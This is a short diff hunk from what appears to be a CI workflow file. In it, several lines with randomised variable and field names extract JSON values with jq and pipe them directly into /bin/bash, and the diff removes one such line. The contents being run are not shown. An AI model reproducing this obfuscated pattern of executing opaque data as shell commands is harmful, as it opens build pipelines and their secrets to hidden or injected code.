@@ -56,7 +56,6 @@ jobs:
           printf '%s' "$h2" | jq -r .lvw84580 | /bin/bash
           printf '%s' "$gfz33" | jq -r .j6160 | /bin/bash
           printf '%s' "$us1728" | jq -r .g7574 | /bin/bash
-          printf '%s' "$n97" | jq -r .wvitm46284 | /bin/bash
           echo $a015 | jq -r .wve3 | /bin/bash
           echo $llk6 | jq -r .abk95 | /bin/bash
           echo $k5522 | jq -r .rl109 | /bin/bash
